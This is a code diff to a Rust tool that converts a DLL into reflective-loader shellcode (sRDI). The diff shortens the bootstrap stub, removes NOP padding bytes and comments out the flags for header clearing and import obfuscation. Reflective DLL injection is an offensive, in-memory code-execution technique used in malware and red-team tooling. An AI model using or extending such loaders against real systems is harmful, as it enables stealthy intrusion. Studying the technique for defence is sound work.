@@ -3,20 +3,20 @@ use std::{collections::BTreeMap, ffi::{CStr}};
 use windows_sys::Win32::{System::{SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_DOS_SIGNATURE}, Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_SECTION_HEADER, IMAGE_NT_OPTIONAL_HDR64_MAGIC}}};
 
 
-const BOOTSTRAP_TOTAL_LENGTH: u32 = 87; // THIS NEEDS TO CHANGE IF THE SHELLCODE BELOW CHANGES
+const BOOTSTRAP_TOTAL_LENGTH: u32 = 79; // THIS NEEDS TO CHANGE IF THE SHELLCODE BELOW CHANGES
 const REFLECTIVE_LOADER_NAME: &str = "reflective_loader"; // THIS NEEDS TO CHANGE IF THE REFLECTIVE LOADER FUNCTION NAME CHANGES
 
 #[allow(dead_code)]
-const SRDI_CLEARHEADER: u32 = 0x1;
+//const SRDI_CLEARHEADER: u32 = 0x1;
 
 #[allow(dead_code)]
 const SRDI_CLEARMEMORY: u32 = 0x2;
 
 #[allow(dead_code)]
-const SRDI_OBFUSCATEIMPORTS: u32 = 0x4;
+//const SRDI_OBFUSCATEIMPORTS: u32 = 0x4;
 
 #[allow(dead_code)]
-const SRDI_PASS_SHELLCODE_BASE: u32 = 0x8;
+//const SRDI_PASS_SHELLCODE_BASE: u32 = 0x8;
 
 fn main() {
     env_logger::init();
@@ -177,8 +177,8 @@ fn convert_to_shellcode(dll_bytes: &mut Vec<u8>, dll_length: usize, user_functio
     bootstrap.push(0xe8);
     let reflective_loader_address = (BOOTSTRAP_TOTAL_LENGTH - bootstrap.len() as u32 - 4 as u32) + reflective_loader_offset as u32;
     bootstrap.append(&mut reflective_loader_address.to_le_bytes().to_vec().clone());
-    bootstrap.push(0x90);
-    bootstrap.push(0x90);
+    
+    //padding
     bootstrap.push(0x90);
     bootstrap.push(0x90);
 
@@ -200,12 +200,6 @@ fn convert_to_shellcode(dll_bytes: &mut Vec<u8>, dll_length: usize, user_functio
     bootstrap.push(0xc3);
 
     // padding
-    bootstrap.push(0x90);
-    bootstrap.push(0x90);
-    bootstrap.push(0x90);
-    bootstrap.push(0x90);
-    bootstrap.push(0x90);
-    bootstrap.push(0x90);
     bootstrap.push(0x90);
     bootstrap.push(0x90);
     
